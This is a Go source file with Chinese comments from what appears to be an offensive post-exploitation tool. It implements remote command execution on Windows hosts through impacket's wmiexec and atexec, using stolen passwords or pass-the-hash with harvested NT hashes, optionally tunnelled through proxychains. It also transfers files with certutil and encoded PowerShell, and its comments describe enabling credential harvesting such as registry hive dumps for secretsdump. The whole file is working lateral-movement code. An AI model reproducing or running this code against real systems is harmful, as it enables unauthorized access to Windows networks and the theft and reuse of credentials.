// smb_shell.go Windows 凭据会话（IIS/Windows 立足点的 SSH 对等物）。
//
// Windows 目标一般没有 sshd——凭据升级会话走 SMB+DCOM：wmiexec.py 每命令
// 一次非交互执行（支持密码与 NT hash 直通,收割到的 hash_nt 不破解直接当
// 会话用）。注册一个真实管理员通道后,session_cred_harvest 的 windows 包
// （cmdkey/PSHistory/reg save hive→离线 secretsdump）才有权限跑全。
package session

import (
	"context"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"sync"
	"time"
	"unicode/utf16"
)

// SMBSecret 是 smbexec 会话的连接参数（随 sessions.secret 落库）。
type SMBSecret struct {
	Host   string `json:"host"`
	User   string `json:"user"` // DOMAIN\user 或 user（本地账号无前缀）
	Pass   string `json:"pass,omitempty"`
	Hash   string `json:"hash,omitempty"` // NT hash（pass-the-hash）
	ProxyC bool   `json:"proxychains,omitempty"`
}

// SMBShell 是 Session 的 Windows SMB 执行实现。默认优先 wmiexec（DCOM/WMI），
// 在目标仅开放 SMB、RPC 动态端口被防火墙拦截时自动回退到 atexec（SMB 服务管理
// 器 + 计划任务，无需 DCOM）。每条 Exec 一次非交互调用（一次 SMB 登录 ~2-6s），
// 零常驻、可恢复、语义诚实（每条命令独立往返，无 shell 状态）。
type SMBShell struct {
	id  int64
	sec SMBSecret

	mu      sync.Mutex
	backend string // ""=auto（先 wmiexec）; "wmiexec"; "atexec"
	pinned  bool   // 环境变量显式指定后端时不再自动回退
}

const (
	smbBackendWMI    = "wmiexec"
	smbBackendATExec = "atexec"
)

// DialSMB 验证参数并选择执行后端（真实拨测在 Test/Exec 时发生）。
func DialSMB(sec SMBSecret) (*SMBShell, error) {
	if sec.Host == "" || sec.User == "" {
		return nil, fmt.Errorf("host/user 必填")
	}
	if sec.Pass == "" && sec.Hash == "" {
		return nil, fmt.Errorf("需要 password 或 NT hash 其一")
	}
	sh := &SMBShell{sec: sec}
	if v := strings.ToLower(strings.TrimSpace(os.Getenv("ARTEX_SMB_BACKEND"))); v == smbBackendWMI || v == smbBackendATExec {
		sh.backend = v
		sh.pinned = true
	}
	return sh, nil
}

// Backend 返回当前实际使用的执行后端（排障与验收用）。
func (s *SMBShell) Backend() string {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.backend == "" {
		return smbBackendWMI
	}
	return s.backend
}

func (s *SMBShell) setBackend(b string) {
	s.mu.Lock()
	s.backend = b
	s.mu.Unlock()
}

func (s *SMBShell) canAutoFallback() bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	return !s.pinned && s.backend != smbBackendATExec
}

// RestoreSMBShell 恢复（wmiexec 无连接态,等价重建）。
func RestoreSMBShell(id int64, sec SMBSecret) (*SMBShell, error) {
	sh, err := DialSMB(sec)
	if err != nil {
		return nil, err
	}
	sh.id = id
	return sh, nil
}

func (s *SMBShell) ID() int64         { return s.id }
func (s *SMBShell) SetID(id int64)    { s.id = id }
func (s *SMBShell) Kind() string      { return "smbexec" }
func (s *SMBShell) Secret() SMBSecret { return s.sec }

// execArgs 组装调用：返回 (bin, args)。hash 优先于密码——hash 是收割直产物；
// ProxyC 时整包走 proxychains（经隧道出口打内网 SMB）。
func (s *SMBShell) execArgs(tool, cmd string) (string, []string) {
	target := s.sec.User + "@" + s.sec.Host
	if s.sec.Pass != "" {
		target = s.sec.User + ":" + s.sec.Pass + "@" + s.sec.Host
	}
	args := []string{"-dc-ip", s.sec.Host}
	if s.sec.Hash != "" {
		args = append(args, "-hashes", ":"+s.sec.Hash)
	}
	args = append(args, target)
	if tool == smbBackendATExec {
		// atexec 的 command 是位置参数列表；整条命令作为单个参数交给计划任务。
		args = append(args, cmd)
	} else {
		args = append(args, cmd)
	}
	bin := tool + ".py"
	if s.sec.ProxyC {
		return "proxychains", append([]string{"-q", bin}, args...)
	}
	return bin, args
}

// fallbackEligible 判断错误是否更像“wmiexec 的 RPC/DCOM 路径不可用”，
// 而不是凭据错误。凭据错误回退到 atexec 只会多一次失败，但不动摇正确性。
func fallbackEligible(err error) bool {
	if err == nil {
		return false
	}
	msg := strings.ToLower(err.Error())
	for _, needle := range []string{
		"connection reset", "connection refused", "errno 54", "no route",
		"connectex", "dial tcp", "i/o timeout", "timed out", "超时", "executable file not found",
	} {
		if strings.Contains(msg, needle) {
			return true
		}
	}
	return false
}

// sanitizeSMBOutput 去掉 Windows 任务输出里的 NUL（UTF-16 残留）与 CR，
// 让上层拿到的 stdout 与 wmiexec 路径一致。
func sanitizeSMBOutput(s string) string {
	s = strings.ReplaceAll(s, "\x00", "")
	s = strings.ReplaceAll(s, "\r\n", "\n")
	s = strings.ReplaceAll(s, "\r", "\n")
	return strings.TrimSpace(s)
}

// bannerRe 剥 impacket 非交互输出的横幅/状态行,只留命令回显。
var bannerRe = regexp.MustCompile(`(?m)^(Impacket v|\[\*\]|\[\!\]|\[\-\])[^\n]*\n?`)

func (s *SMBShell) runWith(ctx context.Context, tool, cmd string, timeout time.Duration) (string, error) {
	if timeout <= 0 {
		timeout = 45 * time.Second // SMB 登录开销大,下限比 HTTP 通道宽
	}
	ectx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	bin, args := s.execArgs(tool, cmd)
	c := exec.CommandContext(ectx, bin, args...)
	out, err := c.CombinedOutput()
	text := sanitizeSMBOutput(stripPythonNoise(string(bannerRe.ReplaceAll(out, nil))))
	if ectx.Err() != nil {
		return "", fmt.Errorf("smbexec(%s) 超时(%s)", tool, timeout)
	}
	if err != nil {
		return text, fmt.Errorf("%s 失败: %w: %s", tool, err, truncText(text, 300))
	}
	return text, nil
}

func (s *SMBShell) run(ctx context.Context, cmd string, timeout time.Duration) (string, error) {
	tool := s.Backend()
	firstTimeout := timeout
	// auto 模式先用较短预算探 wmiexec：RPC/DCOM 被拦时它可能一直挂到超时，
	// 不能让一次 90s 的命令全耗在不可用的后端上。
	if tool == smbBackendWMI && s.canAutoFallback() && (firstTimeout <= 0 || firstTimeout > 20*time.Second) {
		firstTimeout = 20 * time.Second
	}
	out, err := s.runWith(ctx, tool, cmd, firstTimeout)
	if err == nil || tool == smbBackendATExec || !s.canAutoFallback() || !fallbackEligible(err) {
		return out, err
	}
	// RPC/DCOM 被拦时回退到只依赖 SMB 的 atexec；成功后记住后端，后续命令不再重试。
	if _, lookErr := exec.LookPath("atexec.py"); lookErr != nil {
		return out, err
	}
	out2, err2 := s.runWith(ctx, smbBackendATExec, cmd, timeout)
	if err2 == nil {
		s.setBackend(smbBackendATExec)
		return out2, nil
	}
	return out, err
}

// Test 无害探针。
func (s *SMBShell) Test(ctx context.Context) error {
	out, err := s.run(ctx, "echo __smbtest__", 30*time.Second)
	if err != nil {
		return err
	}
	if !strings.Contains(out, "__smbtest__") {
		return fmt.Errorf("探针回显异常: %s", truncText(out, 200))
	}
	return nil
}

// Exec 一条 cmd 命令一次非交互往返。cmd.exe 原生，& 分隔可用。
// atexec 走计划任务，需把整条命令包进一层引号，否则 & 会被外层 cmd 拆开、
// 只有最后一段进入任务输出（真机 Windows 验证过）。
func (s *SMBShell) Exec(ctx context.Context, cmd string, timeout time.Duration) (string, string, error) {
	line := "cmd /c " + cmd
	if s.Backend() == smbBackendATExec {
		escaped := strings.ReplaceAll(cmd, "\"", "\\\"")
		line = "cmd /c \"" + escaped + "\""
	}
	out, err := s.run(ctx, line, timeout)
	return out, "", err
}

// stripPythonNoise 去掉 impacket/ Python 告警行（它们走 stderr，被
// CombinedOutput 合并进输出）。只按行匹配固定前缀/关键词，不误伤命令回显。
func stripPythonNoise(s string) string {
	lines := strings.Split(s, "\n")
	kept := make([]string, 0, len(lines))
	for _, ln := range lines {
		t := strings.TrimSpace(ln)
		if strings.HasPrefix(t, "Impacket v") || strings.HasPrefix(t, "[*]") ||
			strings.HasPrefix(t, "[!]") || strings.HasPrefix(t, "[-]") ||
			strings.Contains(t, "pkg_resources") || strings.Contains(t, "UserWarning:") {
			continue
		}
		kept = append(kept, ln)
	}
	return strings.Join(kept, "\n")
}

// ReadFile 读目标侧文件（二进制安全）。wmiexec 用 certutil 回拉；
// atexec 走计划任务，外层会给命令追加 > 重定向，会吃掉命令自身的 >，
// 因此改用 PowerShell -EncodedCommand 输出 base64（无重定向、无嵌套引号）。
func (s *SMBShell) ReadFile(ctx context.Context, path string) ([]byte, error) {
	if s.Backend() == smbBackendATExec {
		return s.readFilePS(ctx, path)
	}
	return s.readFileCertutil(ctx, path)
}

func (s *SMBShell) readFileCertutil(ctx context.Context, path string) ([]byte, error) {
	tmp := "%TEMP%\\rfx.b64"
	if _, _, err := s.Exec(ctx, "certutil -encode -f "+cmdQuote(path)+" "+tmp, 60*time.Second); err != nil {
		return s.readFilePlain(ctx, path, err)
	}
	out, _, err := s.Exec(ctx, "type "+tmp, 60*time.Second)
	_, _, _ = s.Exec(ctx, "del /f "+tmp, 30*time.Second)
	if err != nil {
		return s.readFilePlain(ctx, path, err)
	}
	if data, ok := decodeBase64Text(out); ok {
		return data, nil
	}
	return s.readFilePlain(ctx, path, nil)
}

// readFilePS 用 PowerShell 读取并输出 base64；atexec 下不依赖命令重定向。
func (s *SMBShell) readFilePS(ctx context.Context, path string) ([]byte, error) {
	quoted := strings.ReplaceAll(path, "'", "''")
	script := "[Convert]::ToBase64String([IO.File]::ReadAllBytes('" + quoted + "'))"
	out, _, err := s.Exec(ctx, "powershell -NoProfile -EncodedCommand "+encodePS(script), 90*time.Second)
	if err != nil {
		return s.readFilePlain(ctx, path, err)
	}
	if data, ok := decodeBase64Text(out); ok {
		return data, nil
	}
	return s.readFilePlain(ctx, path, nil)
}

func decodeBase64Text(out string) ([]byte, bool) {
	var b strings.Builder
	for _, ln := range strings.Split(out, "\n") {
		ln = strings.TrimSpace(ln)
		if ln == "" || strings.Contains(ln, "CERTIFICATE") || strings.Contains(ln, "-----") {
			continue
		}
		if !isBase64Line(ln) {
			continue
		}
		b.WriteString(ln)
	}
	if b.Len() == 0 {
		return nil, false
	}
	data, err := base64.StdEncoding.DecodeString(b.String())
	if err != nil || len(data) == 0 {
		return nil, false
	}
	return data, true
}

// readFilePlain 是 base64 回拉失败时的明文兜底（小文本文件直接 type）。
func (s *SMBShell) readFilePlain(ctx context.Context, path string, cause error) ([]byte, error) {
	out, _, err := s.Exec(ctx, "type "+cmdQuote(path), 45*time.Second)
	if err != nil {
		if cause != nil {
			return nil, cause
		}
		return nil, err
	}
	return []byte(out), nil
}

func isBase64Line(s string) bool {
	if s == "" {
		return false
	}
	for _, r := range s {
		if (r >= 'A' && r <= 'Z') || (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') || r == '+' || r == '/' || r == '=' {
			continue
		}
		return false
	}
	return true
}

// WriteFile 写目标侧文件。wmiexec 走 base64+certutil；atexec 走 PowerShell
// -EncodedCommand（同样因为计划任务会把 > 重定向吃掉）。
func (s *SMBShell) WriteFile(ctx context.Context, path string, data []byte) error {
	if s.Backend() == smbBackendATExec {
		return s.writeFilePS(ctx, path, data)
	}
	return s.writeFileCertutil(ctx, path, data)
}

func (s *SMBShell) writeFileCertutil(ctx context.Context, path string, data []byte) error {
	const chunk = 64 * 1024
	tmp := "%TEMP%\\wfx.b64"
	for off := 0; off < len(data); off += chunk {
		end := off + chunk
		if end > len(data) {
			end = len(data)
		}
		op := ">"
		if off > 0 {
			op = ">>"
		}
		enc := base64.StdEncoding.EncodeToString(data[off:end])
		if _, _, err := s.Exec(ctx, "echo "+enc+" "+op+" "+tmp, 60*time.Second); err != nil {
			return err
		}
	}
	if _, _, err := s.Exec(ctx, "certutil -decode -f "+tmp+" "+cmdQuote(path), 60*time.Second); err != nil {
		return err
	}
	_, _, _ = s.Exec(ctx, "del /f "+tmp, 30*time.Second)
	return nil
}

// writeFilePS 分块写：首块 Create、后续 Append，单块 1500 字节，
// 保证 -EncodedCommand 的 base64 命令长度低于 Windows 8191 字符上限。
func (s *SMBShell) writeFilePS(ctx context.Context, path string, data []byte) error {
	const chunk = 1500
	quoted := strings.ReplaceAll(path, "'", "''")
	if len(data) == 0 {
		script := "$p='" + quoted + "';[IO.File]::WriteAllBytes($p,[byte[]]@())"
		_, _, err := s.Exec(ctx, "powershell -NoProfile -EncodedCommand "+encodePS(script), 90*time.Second)
		return err
	}
	for off := 0; off < len(data); off += chunk {
		end := off + chunk
		if end > len(data) {
			end = len(data)
		}
		mode := "Create"
		if off > 0 {
			mode = "Append"
		}
		enc := base64.StdEncoding.EncodeToString(data[off:end])
		script := "$p='" + quoted + "';$b=[Convert]::FromBase64String('" + enc + "');" +
			"$fs=[IO.File]::Open($p,[IO.FileMode]::" + mode + ",[IO.FileAccess]::Write);" +
			"$fs.Write($b,0,$b.Length);$fs.Close()"
		if _, _, err := s.Exec(ctx, "powershell -NoProfile -EncodedCommand "+encodePS(script), 90*time.Second); err != nil {
			return err
		}
	}
	return nil
}

// encodePS 把脚本编码成 PowerShell -EncodedCommand 需要的 UTF-16LE base64。
func encodePS(script string) string {
	u := utf16.Encode([]rune(script))
	b := make([]byte, len(u)*2)
	for i, v := range u {
		b[i*2] = byte(v)
		b[i*2+1] = byte(v >> 8)
	}
	return base64.StdEncoding.EncodeToString(b)
}

func (s *SMBShell) Close(context.Context) error { return nil }

func cmdQuote(p string) string {
	return `"` + strings.ReplaceAll(p, `"`, `\"`) + `"`
}

func truncText(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}
